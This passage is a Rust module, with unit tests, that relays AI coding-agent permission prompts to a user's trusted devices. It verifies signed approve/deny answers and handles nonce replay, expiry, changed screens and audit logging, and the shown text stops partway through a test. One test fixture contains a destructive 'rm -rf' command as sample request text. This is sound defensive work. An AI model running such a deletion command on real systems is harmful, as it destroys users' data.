use std::collections::{HashMap, HashSet, VecDeque};
use tmgr_ipc::api::{PermissionCard, PermissionChoice};
use tmgr_ipc::chat::PermitCardMsg;
use tmgr_spawn_auth::{
    verify_permit, DesktopPolicy, PermitChoice, PermitOutcome, PermitRecord, PermitScreen,
    PermitSender, PermitSenderKind, PinnedKey, SignedPermit, TrustView, MAX_PERMIT_TTL_MS,
};

const MAX_PENDING: usize = 32;
const MAX_REISSUES: u8 = 3;
const MAX_CLOSED: usize = 128;

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct RunnerIds {
    pub user_id: String,
    pub runner_id: String,
    pub runner_fp: String,
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub enum Action {
    Post {
        card_id: String,
        card: Box<PermitCardMsg>,
    },
    Close {
        card_id: String,
        reason: String,
    },
    Answer {
        session: String,
        card_id: String,
        prompt: String,
        choice: PermissionChoice,
        confirmed: bool,
        audit: String,
    },
    Audit(String),
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct PendingPermit {
    pub record: PermitRecord,
    pub reissues: u8,
    pub idle: u8,
    pub burned: HashSet<String>,
    pub prompt: String,
    raw: PermissionCard,
    answering: Option<String>,
}

#[derive(Debug, Default)]
pub struct PermitDesk {
    pending: HashMap<String, PendingPermit>,
    closed: VecDeque<String>,
    salt: String,
    serial: u64,
    desktop: DesktopPolicy,
    presence_fps: Vec<String>,
}

pub type FreshNonce<'a> = &'a mut dyn FnMut() -> Option<String>;

impl PermitDesk {
    pub fn new() -> Self {
        Self::default()
    }

    pub fn set_desktop(&mut self, policy: DesktopPolicy) {
        self.desktop = policy;
    }

    pub fn set_presence_fps(&mut self, fps: Vec<String>) {
        self.presence_fps = fps;
    }

    pub fn pending(&self, card_id: &str) -> Option<&PendingPermit> {
        self.pending.get(card_id)
    }

    pub fn is_current(&self, card_id: &str, nonce: &str) -> bool {
        self.pending
            .get(card_id)
            .is_some_and(|p| p.record.nonce == nonce)
    }

    pub fn len(&self) -> usize {
        self.pending.len()
    }

    pub fn is_empty(&self) -> bool {
        self.pending.is_empty()
    }

    pub fn observe(
        &mut self,
        session: &str,
        card: Option<&PermissionCard>,
        ids: &RunnerIds,
        now_ms: u64,
        fresh_nonce: FreshNonce<'_>,
    ) -> Vec<Action> {
        let mut out = Vec::new();
        let desktop = self.desktop;
        let fps = self.presence_fps.clone();
        let live = card.filter(|c| c.can_answer);
        let held = self
            .pending
            .iter()
            .find(|(_, p)| p.record.session == session)
            .map(|(id, _)| id.clone());
        if let Some(id) = held {
            let p = self.pending.get_mut(&id).expect("held card is pending");
            if p.answering.is_some() {
                return out;
            }
            if live.is_some_and(|c| c.id == p.prompt) {
                return out;
            }
            self.pending.remove(&id);
            out.push(close(&id, "gone"));
        }
        let Some(c) = live else {
            return out;
        };
        if self.closed.contains(&c.id) || self.pending.values().any(|p| p.prompt == c.id) {
            return out;
        }
        let Some(nonce) = fresh_nonce() else {
            return out;
        };
        let Some(card_id) = self.relay_id(&c.id) else {
            return out;
        };
        if self.pending.len() >= MAX_PENDING {
            let oldest = self
                .pending
                .iter()
                .min_by_key(|(_, p)| p.record.exp_ms)
                .map(|(id, _)| id.clone());
            if let Some(id) = oldest {
                if let Some(p) = self.pending.remove(&id) {
                    self.tombstone(&p.prompt);
                }
                out.push(close(&id, "gone"));
            }
        }
        let record = PermitRecord {
            user_id: ids.user_id.clone(),
            runner_id: ids.runner_id.clone(),
            runner_fp: ids.runner_fp.clone(),
            card_id: card_id.clone(),
            session: session.to_string(),
            nonce,
            issued_ms: now_ms,
            exp_ms: now_ms.saturating_add(MAX_PERMIT_TTL_MS),
            screen: screen_of(c),
        };
        let p = PendingPermit {
            record,
            reissues: 0,
            idle: 0,
            burned: HashSet::new(),
            prompt: c.id.clone(),
            raw: c.clone(),
            answering: None,
        };
        out.push(post(&card_id, &p, desktop, &fps));
        self.pending.insert(card_id, p);
        out
    }

    pub fn refresh(
        &mut self,
        card_id: &str,
        nonce: &str,
        current: Option<&PermissionCard>,
        now_ms: u64,
        fresh_nonce: FreshNonce<'_>,
    ) -> Vec<Action> {
        let desktop = self.desktop;
        let fps = self.presence_fps.clone();
        let Some(p) = self.pending.get_mut(card_id) else {
            return Vec::new();
        };
        let live = current.filter(|c| c.id == p.prompt && c.can_answer);
        if p.answering.is_some()
            || live.is_none()
            || p.record.nonce != nonce
            || now_ms <= p.record.exp_ms
        {
            return Vec::new();
        }
        if live.is_some_and(|c| !same_screen(c, &p.raw)) {
            self.pending.remove(card_id);
            return vec![close(card_id, "gone")];
        }
        let Some(fresh) = fresh_nonce() else {
            return Vec::new();
        };
        p.reissue(now_ms, fresh, true);
        vec![post(card_id, p, desktop, &fps)]
    }

    pub fn answered_locally(&mut self, id: &str) -> Vec<Action> {
        let Some(card_id) = self
            .pending
            .iter()
            .find(|(k, p)| *k == id || p.prompt == id)
            .map(|(k, _)| k.clone())
        else {
            return Vec::new();
        };
        let Some(p) = self.pending.remove(&card_id) else {
            return Vec::new();
        };
        self.tombstone(&p.prompt);
        vec![close(&card_id, "answered in attach")]
    }

    pub fn answered(&mut self, card_id: &str) -> Vec<Action> {
        let Some(reason) = self.pending.get(card_id).and_then(|p| p.answering.clone()) else {
            return Vec::new();
        };
        if let Some(p) = self.pending.remove(card_id) {
            self.tombstone(&p.prompt);
        }
        vec![close(card_id, &reason)]
    }

    pub fn answer_failed(
        &mut self,
        card_id: &str,
        retry: bool,
        now_ms: u64,
        fresh_nonce: FreshNonce<'_>,
    ) -> Vec<Action> {
        let desktop = self.desktop;
        let fps = self.presence_fps.clone();
        let Some(p) = self.pending.get_mut(card_id) else {
            return Vec::new();
        };
        if p.answering.take().is_none() {
            return Vec::new();
        }
        let reason = if !retry {
            "gone"
        } else if p.reissues < MAX_REISSUES {
            return match fresh_nonce() {
                Some(nonce) => {
                    p.reissue(now_ms, nonce, false);
                    vec![post(card_id, p, desktop, &fps)]
                }
                None => {
                    p.record.exp_ms = p.record.exp_ms.min(now_ms);
                    Vec::new()
                }
            };
        } else {
            "answer in attach"
        };
        if let Some(p) = self.pending.remove(card_id) {
            self.tombstone(&p.prompt);
        }
        vec![close(card_id, reason)]
    }

    #[allow(clippy::too_many_arguments)]
    pub fn accept(
        &mut self,
        signed: &SignedPermit,
        key: Option<&PinnedKey>,
        sender: PermitSender<'_>,
        trust: &dyn TrustView,
        sender_label: &str,
        current: Option<&PermissionCard>,
        now_ms: u64,
        fresh_nonce: FreshNonce<'_>,
    ) -> Vec<Action> {
        let id = signed.card_id.clone();
        let desktop = self.desktop;
        let fps = self.presence_fps.clone();
        let sender = PermitSender { desktop, ..sender };
        let line = |result: &str, action: &str| Action::Audit(audit_line(signed, result, action));
        let Some(p) = self.pending.get_mut(&id) else {
            return vec![line("stale", "dropped")];
        };
        if p.answering.is_some() || p.burned.contains(&signed.nonce) {
            return vec![line("stale", "dropped")];
        }
        let Some(key) = key else {
            return vec![line("unknown_key", "dropped")];
        };
        let verdict = verify_permit(signed, &p.record, key, sender, trust, now_ms);
        let refusal = verdict.err();
        let Some(e) = refusal else {
            p.burned.insert(p.record.nonce.clone());
            let screen_same =
                current.is_some_and(|c| c.id == p.prompt && c.can_answer && same_screen(c, &p.raw));
            if !screen_same {
                if let Some(p) = self.pending.remove(&id) {
                    self.tombstone(&p.prompt);
                }
                return vec![close(&id, "gone"), line("screen_changed", "closed")];
            }
            p.answering = Some(format!("answered on {sender_label}"));
            return vec![Action::Answer {
                session: p.record.session.clone(),
                card_id: id.clone(),
                prompt: p.prompt.clone(),
                choice: match signed.choice {
                    PermitChoice::Yes => PermissionChoice::Yes,
                    PermitChoice::No => PermissionChoice::No,
                    PermitChoice::Always => PermissionChoice::Always,
                },
                confirmed: signed.confirmed == 1,
                audit: audit_line(signed, "ok", "answered"),
            }];
        };
        match e.outcome() {
            PermitOutcome::Drop => vec![line(e.code(), "dropped")],
            PermitOutcome::Reissue => {
                if p.reissues < MAX_REISSUES {
                    let Some(nonce) = fresh_nonce() else {
                        return vec![line(e.code(), "dropped")];
                    };
                    p.reissue(now_ms, nonce, false);
                    vec![post(&id, p, desktop, &fps), line(e.code(), "reissued")]
                } else {
                    if let Some(p) = self.pending.remove(&id) {
                        self.tombstone(&p.prompt);
                    }
                    vec![close(&id, "answer in attach"), line(e.code(), "closed")]
                }
            }
        }
    }

    fn relay_id(&mut self, prompt: &str) -> Option<String> {
        if self.salt.is_empty() {
            let mut b = [0u8; 16];
            getrandom::fill(&mut b).ok()?;
            self.salt = b.iter().map(|x| format!("{x:02x}")).collect();
        }
        self.serial += 1;
        Some(crate::permit::digest(&[
            &self.salt,
            &self.serial.to_string(),
            prompt,
        ]))
    }

    fn tombstone(&mut self, prompt: &str) {
        if self.closed.len() >= MAX_CLOSED {
            self.closed.pop_front();
        }
        self.closed.push_back(prompt.to_string());
    }
}

impl PendingPermit {
    fn reissue(&mut self, now_ms: u64, nonce: String, idle: bool) {
        let old = std::mem::replace(&mut self.record.nonce, nonce);
        self.burned.insert(old);
        self.record.issued_ms = now_ms;
        self.record.exp_ms = now_ms.saturating_add(MAX_PERMIT_TTL_MS);
        if idle {
            self.idle = self.idle.saturating_add(1);
        } else {
            self.reissues += 1;
        }
    }
}

fn close(card_id: &str, reason: &str) -> Action {
    Action::Close {
        card_id: card_id.to_string(),
        reason: reason.to_string(),
    }
}

fn post(card_id: &str, p: &PendingPermit, desktop: DesktopPolicy, fps: &[String]) -> Action {
    let r = &p.record;
    let reissue = p.reissues.saturating_add(p.idle);
    let s = &r.screen;
    Action::Post {
        card_id: card_id.to_string(),
        card: Box::new(PermitCardMsg {
            session: r.session.clone(),
            runner_id: r.runner_id.clone(),
            runner_fp: r.runner_fp.clone(),
            nonce: r.nonce.clone(),
            exp_ms: r.exp_ms,
            req_sha256: s.req_sha256(),
            reissue,
            agent: s.agent.clone(),
            tool: s.tool.clone(),
            text: s.text.clone(),
            path: s.path.clone(),
            reason: s.reason.clone(),
            from: s.from.clone(),
            warning: s.warning.clone(),
            danger: s.danger.clone(),
            always_label: s.always_label.clone(),
            desktop_ok: desktop.allows(PermitSenderKind::Desktop, s),
            presence_fps: if desktop.wants_presence(s) {
                fps.to_vec()
            } else {
                Vec::new()
            },
        }),
    }
}

pub(crate) fn strip_bidi(s: &str) -> String {
    s.chars()
        .filter(|c| {
            !matches!(
                c,
                '\u{200e}' | '\u{200f}' | '\u{202a}'..='\u{202e}' | '\u{2066}'..='\u{2069}' | '\u{061c}'
            )
        })
        .collect()
}

fn same_screen(a: &PermissionCard, b: &PermissionCard) -> bool {
    a.agent == b.agent
        && a.tool == b.tool
        && a.text == b.text
        && a.path == b.path
        && a.reason == b.reason
        && a.from == b.from
        && a.warning == b.warning
        && a.danger == b.danger
        && a.always_label == b.always_label
}

fn screen_of(c: &PermissionCard) -> PermitScreen {
    let opt = |s: &Option<String>| s.as_deref().map(strip_bidi);
    PermitScreen {
        agent: strip_bidi(&c.agent),
        tool: strip_bidi(&c.tool),
        text: strip_bidi(&c.text),
        path: opt(&c.path),
        reason: opt(&c.reason),
        from: opt(&c.from),
        warning: opt(&c.warning),
        danger: c.danger.iter().map(|d| strip_bidi(d)).collect(),
        always_label: opt(&c.always_label),
    }
}

fn audit_line(s: &SignedPermit, result: &str, action: &str) -> String {
    let clean = |v: &str, max: usize| -> String {
        v.chars()
            .filter(|c| c.is_ascii_alphanumeric() || matches!(c, '-' | '_'))
            .take(max)
            .collect()
    };
    let choice = match s.choice {
        PermitChoice::Yes => "yes",
        PermitChoice::No => "no",
        PermitChoice::Always => "always",
    };
    format!(
        "permit answer: card={} device={} choice={choice} result={result} action={action}",
        clean(&s.card_id, 64),
        clean(&s.device_fp, 12)
    )
}

#[cfg(test)]
mod tests {
    use super::*;
    use p256::ecdsa::signature::Signer;
    use p256::ecdsa::{Signature, SigningKey};
    use tmgr_spawn_auth::{b64_encode, permit_signed_string, PermitKey, TrustStatus};

    struct Trust(TrustStatus);
    impl TrustView for Trust {
        fn status(&self, _: &str, _: &str) -> TrustStatus {
            self.0
        }
    }

    const T0: u64 = 1_000_000;
    const CARD: &str = "card-1";
    const SESSION: &str = "s_abcdefghij";

    fn sk() -> SigningKey {
        SigningKey::from_slice(&[3; 32]).unwrap()
    }

    fn key() -> PinnedKey {
        PinnedKey {
            user_id: "42".into(),
            device_id: "dev-1".into(),
            device_fp: "d".repeat(64),
            spawn_pub: sk()
                .verifying_key()
                .to_encoded_point(false)
                .as_bytes()
                .to_vec(),
        }
    }

    fn ids() -> RunnerIds {
        RunnerIds {
            user_id: "42".into(),
            runner_id: "mx_00aa".into(),
            runner_fp: "f".repeat(64),
        }
    }

    fn card() -> PermissionCard {
        PermissionCard {
            id: CARD.into(),
            session: SESSION.into(),
            agent: "claude-code".into(),
            tool: "Bash".into(),
            text: "rm -rf SECRETCOMMAND".into(),
            path: Some("/work/app".into()),
            reason: Some("cleanup".into()),
            from: None,
            warning: None,
            danger: vec![],
            can_answer: true,
            why_not: None,
            always_label: Some("Always allow".into()),
            armed_in_ms: 0,
        }
    }

    struct Gen(u64);
    impl Gen {
        fn next(&mut self) -> Option<String> {
            self.0 += 1;
            Some(format!("{:032x}", self.0))
        }
    }

    fn desk_with(c: &PermissionCard, g: &mut Gen) -> PermitDesk {
        desk_under(DesktopPolicy::Safe, c, g)
    }

    fn desk_under(policy: DesktopPolicy, c: &PermissionCard, g: &mut Gen) -> PermitDesk {
        let mut d = PermitDesk::new();
        d.set_desktop(policy);
        let acts = d.observe(SESSION, Some(c), &ids(), T0, &mut || g.next());
        assert!(matches!(acts.as_slice(), [Action::Post { .. }]), "{acts:?}");
        d
    }

    fn sign(rec: &PermitRecord, choice: PermitChoice, confirmed: u8) -> SignedPermit {
        let k = key();
        let mut s = SignedPermit {
            v: 1,
            user_id: rec.user_id.clone(),
            device_fp: k.device_fp.clone(),
            runner_id: rec.runner_id.clone(),
            runner_fp: rec.runner_fp.clone(),
            card_id: rec.card_id.clone(),
            session: rec.session.clone(),
            choice,
            confirmed,
            nonce: rec.nonce.clone(),
            ts_ms: T0 + 500,
            exp_ms: rec.exp_ms,
            req_sha256: rec.screen.req_sha256(),
            alg: "es256".into(),
            k: PermitKey::Chat,
            sig: String::new(),
        };
        let sig: Signature = sk().sign(permit_signed_string(rec, &k, &s).as_bytes());
        s.sig = b64_encode(sig.to_der().as_bytes());
        s
    }

    fn cid(d: &PermitDesk) -> String {
        assert_eq!(d.pending.len(), 1);
        d.pending.keys().next().unwrap().clone()
    }

    fn rec(d: &PermitDesk) -> PermitRecord {
        d.pending(&cid(d)).unwrap().record.clone()
    }

    struct Ctx {
        trust: TrustStatus,
        owner: bool,
        kind: PermitSenderKind,
        key: Option<PinnedKey>,
        label: &'static str,
    }

    impl Ctx {
        fn ok() -> Self {
            Ctx {
                trust: TrustStatus::Trusted,
                owner: true,
                kind: PermitSenderKind::Mobile,
                key: Some(key()),
                label: "Mac",
            }
        }
    }

    fn accept(
        d: &mut PermitDesk,
        s: &SignedPermit,
        c: &Ctx,
        current: Option<&PermissionCard>,
        now: u64,
        g: &mut Gen,
    ) -> Vec<Action> {
        d.accept(
            s,
            c.key.as_ref(),
            PermitSender {
                device_fp: &s.device_fp,
                owner_device: c.owner,
                kind: c.kind,
                desktop: DesktopPolicy::All,
                presence: None,
            },
            &Trust(c.trust),
            c.label,
            current,
            now,
            &mut || g.next(),
        )
    }

    fn audit(acts: &[Action]) -> String {
        let lines: Vec<_> = acts
            .iter()
            .filter_map(|a| match a {
                Action::Audit(s) => Some(s.clone()),
                _ => None,
            })
            .collect();
        assert_eq!(lines.len(), 1, "{acts:?}");
        lines[0].clone()
    }

    fn answer_audit(acts: &[Action]) -> String {
        acts.iter()
            .find_map(|a| match a {
                Action::Answer { audit, .. } => Some(audit.clone()),
                _ => None,
            })
            .expect("no Answer")
    }

    fn only_audit(acts: &[Action]) {
        assert!(
            acts.iter().all(|a| matches!(a, Action::Audit(_))),
            "{acts:?}"
        );
        audit(acts);
    }

    fn answers(acts: &[Action]) -> usize {
        acts.iter()
            .filter(|a| matches!(a, Action::Answer { .. }))
            .count()
    }

    fn closes(acts: &[Action]) -> Vec<String> {
        acts.iter()
            .filter_map(|a| match a {
                Action::Close { reason, .. } => Some(reason.clone()),
                _ => None,
            })
            .collect()
    }

    fn posted(acts: &[Action]) -> PermitCardMsg {
        acts.iter()
            .find_map(|a| match a {
                Action::Post { card, .. } => Some((**card).clone()),
                _ => None,
            })
            .expect("no Post")
    }

    #[test]
    fn desktop_answer_ok() {
        let mut g = Gen(0);
        let c = card();
        let mut d = desk_with(&c, &mut g);
        let id = cid(&d);
        let s = sign(&rec(&d), PermitChoice::Yes, 0);
        let acts = accept(&mut d, &s, &Ctx::ok(), Some(&c), T0 + 1000, &mut g);
        assert_eq!(
            acts[0],
            Action::Answer {
                session: SESSION.into(),
                card_id: id.clone(),
                prompt: CARD.into(),
                choice: PermissionChoice::Yes,
                confirmed: false,
                audit: format!(
                    "permit answer: card={} device={} choice=yes result=ok action=answered",
                    id,
                    "d".repeat(12)
                )
            }
        );
        assert!(closes(&acts).is_empty());
        assert_eq!(
            closes(&d.answered(&id)),
            vec!["answered on Mac".to_string()]
        );
        let a = answer_audit(&acts);
        assert_eq!(
            a,
            format!(
                "permit answer: card={} device={} choice=yes result=ok action=answered",
                id,
                "d".repeat(12)
            )
        );
        assert!(d.is_empty());
    }

    #[test]
    fn mobile_answer_ok() {
        let mut g = Gen(0);
        let c = card();
        let mut d = desk_with(&c, &mut g);
        let s = sign(&rec(&d), PermitChoice::Always, 1);
        let ctx = Ctx {
            label: "Phone",
            ..Ctx::ok()
        };
        let acts = accept(&mut d, &s, &ctx, Some(&c), T0 + 1000, &mut g);
        assert_eq!(answers(&acts), 1);
        assert!(matches!(
            acts[0],
            Action::Answer {
                choice: PermissionChoice::Always,
                confirmed: true,
                ..
            }
        ));
        assert_eq!(
            closes(&d.answered(&cid(&d))),
            vec!["answered on Phone".to_string()]
        );
        assert!(answer_audit(&acts).contains("choice=always result=ok action=answered"));
    }

    fn assert_dropped_and_still_answerable(ctx: Ctx) {
        let mut g = Gen(0);
        let c = card();
        let mut d = desk_with(&c, &mut g);
        let before = d.pending(&cid(&d)).unwrap().clone();
        let s = sign(&before.record, PermitChoice::Yes, 0);
        let acts = accept(&mut d, &s, &ctx, Some(&c), T0 + 1000, &mut g);
        only_audit(&acts);
        assert!(audit(&acts).ends_with("action=dropped"), "{acts:?}");
        assert_eq!(d.pending(&cid(&d)).unwrap(), &before);
        assert_eq!(before.reissues, 0);
        let acts = accept(&mut d, &s, &Ctx::ok(), Some(&c), T0 + 1001, &mut g);
        assert_eq!(answers(&acts), 1);
    }

    #[test]
    fn non_owner_device_with_valid_signature_is_dropped() {
        assert_dropped_and_still_answerable(Ctx {
            owner: false,
            ..Ctx::ok()
        });
    }

    #[test]
    fn untrusted_and_revoked_senders_are_dropped() {
        for t in [
            TrustStatus::NotTrusted,
            TrustStatus::Revoked,
            TrustStatus::Unknown,
        ] {
            assert_dropped_and_still_answerable(Ctx {
                trust: t,
                ..Ctx::ok()
            });
        }
    }

    #[test]
    fn missing_key_is_dropped() {
        assert_dropped_and_still_answerable(Ctx {
            key: None,
            ..Ctx::ok()
        });
    }

    #[test]
    fn unknown_card_is_audited_only() {
        let mut g = Gen(0);
        let c = card();
        let mut d = desk_with(&c, &mut g);
        let mut s = sign(&rec(&d), PermitChoice::Yes, 0);
        s.card_id = "other".into();
        let acts = accept(&mut d, &s, &Ctx::ok(), Some(&c), T0 + 1, &mut g);
        only_audit(&acts);
        assert!(d.pending(&cid(&d)).is_some());
    }

    #[test]
    fn bad_signature_is_dropped_and_the_card_stays_answerable() {
        let mut g = Gen(0);
        let c = card();
        let mut d = desk_with(&c, &mut g);
        let before = d.pending(&cid(&d)).unwrap().clone();
        let r = rec(&d);
        let mut s = sign(&r, PermitChoice::Yes, 0);
        let other: Signature = SigningKey::from_slice(&[9; 32])
            .unwrap()
            .sign(permit_signed_string(&r, &key(), &s).as_bytes());
        s.sig = b64_encode(other.to_der().as_bytes());
        let acts = accept(&mut d, &s, &Ctx::ok(), Some(&c), T0 + 1, &mut g);
        only_audit(&acts);
        assert!(audit(&acts).contains("result=bad_sig action=dropped"));
        assert_eq!(d.pending(&cid(&d)).unwrap(), &before);
        let good = sign(&r, PermitChoice::Yes, 0);
        let acts = accept(&mut d, &good, &Ctx::ok(), Some(&c), T0 + 2, &mut g);
        assert_eq!(answers(&acts), 1);
    }

    #[test]
    fn unsigned_junk_on_a_danger_card_burns_nothing_and_uses_no_reissue() {
        let mut g = Gen(0);
        let c = danger_card();
        let mut d = desk_under(DesktopPolicy::Safe, &c, &mut g);
        let before = d.pending(&cid(&d)).unwrap().clone();
        for _ in 0..5 {
            let mut s = sign(&rec(&d), PermitChoice::Yes, 0);
            s.sig = "AAAA".into();
            let acts = accept(&mut d, &s, &Ctx::ok(), Some(&c), T0 + 1, &mut g);
            only_audit(&acts);
            assert!(audit(&acts).contains("action=dropped"));
        }
        assert_eq!(d.pending(&cid(&d)).unwrap(), &before);
        let s = sign(&rec(&d), PermitChoice::Yes, 1);
        assert_eq!(
            answers(&accept(&mut d, &s, &Ctx::ok(), Some(&c), T0 + 2, &mut g)),
            1
        );
    }

    #[test]
    fn expired_answer_reissues_with_a_fresh_nonce() {
        let mut g = Gen(0);
        let c = card();
        let mut d = desk_with(&c, &mut g);
        let old = rec(&d);
        let s_old = sign(&old, PermitChoice::Yes, 0);
        let late = old.exp_ms + 1;
        let acts = accept(&mut d, &s_old, &Ctx::ok(), Some(&c), late, &mut g);
        assert_eq!(answers(&acts), 0);
        let p = posted(&acts);
        assert_ne!(p.nonce, old.nonce);
        assert_eq!(p.reissue, 1);
        assert_eq!(p.exp_ms, late + MAX_PERMIT_TTL_MS);
        assert!(audit(&acts).contains("result=expired action=reissued"));
        let acts = accept(&mut d, &s_old, &Ctx::ok(), Some(&c), late + 1, &mut g);
        only_audit(&acts);
        assert!(audit(&acts).contains("result=stale action=dropped"));
        let s_new = sign(&rec(&d), PermitChoice::Yes, 0);
        let acts = accept(&mut d, &s_new, &Ctx::ok(), Some(&c), late + 2, &mut g);
        assert_eq!(answers(&acts), 1);
    }

    #[test]
    fn four_non_terminal_refusals_close_the_card() {
        let mut g = Gen(0);
        let c = card();
        let mut d = desk_with(&c, &mut g);
        for i in 1..=3u8 {
            let now = rec(&d).exp_ms + 1;
            let s = sign(&rec(&d), PermitChoice::Yes, 0);
            let acts = accept(&mut d, &s, &Ctx::ok(), Some(&c), now, &mut g);
            assert_eq!(posted(&acts).reissue, i);
        }
        let now = rec(&d).exp_ms + 1;
        let s = sign(&rec(&d), PermitChoice::Yes, 0);
        let acts = accept(&mut d, &s, &Ctx::ok(), Some(&c), now, &mut g);
        assert_eq!(closes(&acts), vec!["answer in attach".to_string()]);
        assert!(audit(&acts).contains("action=closed"));
        assert!(d.is_empty());
        let acts = d.observe(SESSION, Some(&c), &ids(), now + 1, &mut || g.next());
        assert!(acts.is_empty(), "{acts:?}");
    }

    #[test]
    fn danger_yes_without_confirmation_is_reissued() {
        let mut g = Gen(0);
        let mut c = card();
        c.danger = vec!["deletes files".into()];
        let mut d = desk_with(&c, &mut g);
        let s = sign(&rec(&d), PermitChoice::Yes, 0);
        let acts = accept(&mut d, &s, &Ctx::ok(), Some(&c), T0 + 1, &mut g);
        assert_eq!(answers(&acts), 0);
        assert_eq!(posted(&acts).reissue, 1);
        assert!(audit(&acts).contains("result=needs_confirm action=reissued"));
    }

    #[test]
    fn answer_after_the_screen_changed_is_closed_without_answering() {
        let mut g = Gen(0);
        let c = card();
        let mut d = desk_with(&c, &mut g);
        let s = sign(&rec(&d), PermitChoice::Yes, 0);
        let mut changed = c.clone();
        changed.warning = Some("different".into());
        let acts = accept(&mut d, &s, &Ctx::ok(), Some(&changed), T0 + 1, &mut g);
        assert_eq!(answers(&acts), 0);
        assert_eq!(closes(&acts), vec!["gone".to_string()]);
        assert!(d.is_empty());
        let mut d = desk_with(&c, &mut g);
        let s = sign(&rec(&d), PermitChoice::Yes, 0);
        let acts = accept(&mut d, &s, &Ctx::ok(), None, T0 + 1, &mut g);
        assert_eq!(answers(&acts), 0);
        assert_eq!(closes(&acts), vec!["gone".to_string()]);
    }

    #[test]
    fn a_used_nonce_never_answers_twice() {
        let mut g = Gen(0);
        let c = card();
        let mut d = desk_with(&c, &mut g);
        let s = sign(&rec(&d), PermitChoice::Yes, 0);
        assert_eq!(
            answers(&accept(&mut d, &s, &Ctx::ok(), Some(&c), T0 + 1, &mut g)),
            1
        );
        let acts = accept(&mut d, &s, &Ctx::ok(), Some(&c), T0 + 2, &mut g);
        assert_eq!(answers(&acts), 0);
    }

    #[test]
    fn observe_posts_a_new_card_once() {
        let mut g = Gen(0);
        let c = card();
        let mut d = PermitDesk::new();
        let acts = d.observe(SESSION, Some(&c), &ids(), T0, &mut || g.next());
        let p = posted(&acts);
        assert_eq!(p.session, SESSION);
        assert_eq!(p.runner_id, "mx_00aa");
        assert_eq!(p.exp_ms, T0 + MAX_PERMIT_TTL_MS);
        assert_eq!(p.reissue, 0);
        assert_eq!(p.text, c.text);
        assert_eq!(p.req_sha256, rec(&d).screen.req_sha256());
        assert!(matches!(&acts[0], Action::Post { card_id, .. } if *card_id == cid(&d)));
        let acts = d.observe(SESSION, Some(&c), &ids(), T0 + 5, &mut || g.next());
        assert!(acts.is_empty());
    }

    #[test]
    fn observe_disappearing_card_closes_gone() {
        let mut g = Gen(0);
        let c = card();
        let mut d = desk_with(&c, &mut g);
        let id = cid(&d);
        let acts = d.observe(SESSION, None, &ids(), T0 + 5, &mut || g.next());
        assert_eq!(
            acts,
            vec![Action::Close {
                card_id: id,
                reason: "gone".into()
            }]
        );
        assert!(d.is_empty());
    }

    #[test]
    fn observe_replaced_card_closes_old_and_posts_new() {
        let mut g = Gen(0);
        let c = card();
        let mut d = desk_with(&c, &mut g);
        let mut next = card();
        next.id = "card-2".into();
        let acts = d.observe(SESSION, Some(&next), &ids(), T0 + 5, &mut || g.next());
        assert_eq!(closes(&acts), vec!["gone".to_string()]);
        assert!(matches!(&acts[1], Action::Post { card_id, .. } if *card_id == cid(&d)));
    }

    #[test]
    fn answered_locally_closes_in_attach() {
        let mut g = Gen(0);
        let c = card();
        let mut d = desk_with(&c, &mut g);
        let acts = d.answered_locally(CARD);
        assert_eq!(closes(&acts), vec!["answered in attach".to_string()]);
        assert!(d.is_empty());
        assert!(d.answered_locally(CARD).is_empty());
        let acts = d.observe(SESSION, Some(&c), &ids(), T0 + 1, &mut || g.next());
        assert!(acts.is_empty());
    }

    #[test]
    fn view_only_card_is_not_posted() {
        let mut g = Gen(0);
        let mut c = card();
        c.can_answer = false;
        let mut d = PermitDesk::new();
        let acts = d.observe(SESSION, Some(&c), &ids(), T0, &mut || g.next());
        assert!(acts.is_empty());
        assert!(d.is_empty());
    }

    fn refresh(
        d: &mut PermitDesk,
        id: &str,
        nonce: &str,
        c: Option<&PermissionCard>,
        now: u64,
        g: &mut Gen,
    ) -> Vec<Action> {
        d.refresh(id, nonce, c, now, &mut || g.next())
    }

    fn post_count(acts: &[Action]) -> usize {
        acts.iter()
            .filter(|a| matches!(a, Action::Post { .. }))
            .count()
    }

    #[test]
    fn a_request_left_open_for_ten_expiry_periods_posts_exactly_one_card() {
        let mut g = Gen(0);
        let c = card();
        let mut d = PermitDesk::new();
        let mut posts = post_count(&d.observe(SESSION, Some(&c), &ids(), T0, &mut || g.next()));
        for k in 1..=10u64 {
            let now = T0 + k * (MAX_PERMIT_TTL_MS + 1);
            posts += post_count(&d.observe(SESSION, Some(&c), &ids(), now, &mut || g.next()));
        }
        assert_eq!(posts, 1);
        assert_eq!(d.len(), 1);
    }

    #[test]
    fn a_refresh_on_an_expired_card_reposts_once_with_the_same_id_and_a_new_nonce() {
        let mut g = Gen(0);
        let c = card();
        let mut d = desk_with(&c, &mut g);
        let old = rec(&d);
        let id = cid(&d);
        let now = old.exp_ms + 1;
        let acts = refresh(&mut d, &id, &old.nonce, Some(&c), now, &mut g);
        assert_eq!(acts.len(), 1, "{acts:?}");
        assert!(matches!(&acts[0], Action::Post { card_id, .. } if *card_id == id));
        let p = posted(&acts);
        assert_ne!(p.nonce, old.nonce);
        assert_eq!(p.exp_ms, now + MAX_PERMIT_TTL_MS);
        assert_eq!(d.pending(&id).unwrap().reissues, 0);
        let again = refresh(&mut d, &id, &old.nonce, Some(&c), now + 1, &mut g);
        assert!(again.is_empty(), "{again:?}");
        let s = sign(&old, PermitChoice::Yes, 0);
        let acts = accept(&mut d, &s, &Ctx::ok(), Some(&c), now + 2, &mut g);
        assert_eq!(answers(&acts), 0);
        let s = sign(&rec(&d), PermitChoice::Yes, 0);
        let acts = accept(&mut d, &s, &Ctx::ok(), Some(&c), now + 3, &mut g);
        assert_eq!(answers(&acts), 1);
    }

    #[test]
    fn a_refresh_before_expiry_is_dropped() {
        let mut g = Gen(0);
        let c = card();
        let mut d = desk_with(&c, &mut g);
        let r = rec(&d);
        let id = cid(&d);
        for now in [T0, r.exp_ms] {
            assert!(refresh(&mut d, &id, &r.nonce, Some(&c), now, &mut g).is_empty());
        }
        assert_eq!(rec(&d), r);
    }

    #[test]
    fn a_refresh_for_an_unknown_closed_or_stale_card_is_dropped() {
        let mut g = Gen(0);
        let c = card();
        let mut d = desk_with(&c, &mut g);
        let r = rec(&d);
        let id = cid(&d);
        let late = r.exp_ms + 1;
        assert!(refresh(&mut d, "nope", &r.nonce, Some(&c), late, &mut g).is_empty());
        assert!(refresh(&mut d, &id, &"0".repeat(32), Some(&c), late, &mut g).is_empty());
        d.observe(SESSION, None, &ids(), late, &mut || g.next());
